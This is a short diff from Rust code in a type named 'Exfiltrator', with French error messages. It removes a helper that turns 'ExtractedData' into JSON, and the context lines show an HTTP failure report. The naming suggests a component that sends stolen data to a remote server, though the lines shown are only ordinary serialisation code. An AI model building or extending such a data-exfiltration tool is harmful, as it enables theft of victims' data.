@@ -42,15 +42,4 @@ impl Exfiltrator {
             Err(format!("Échec (HTTP {}).", resp.status()))
         }
     }
-
-    fn format_message(&self, data: &ExtractedData) -> String {
-    match serde_json::to_string_pretty(data) {
-        Ok(json_string) => json_string,
-        Err(e) => {
-            eprintln!("Erreur lors de la sérialisation JSON : {}", e);
-            format!(r#"{{"error": "Impossible de sérialiser les données", "details": "{}"}}"#, e)
-        }
-    }
-}
-
 }
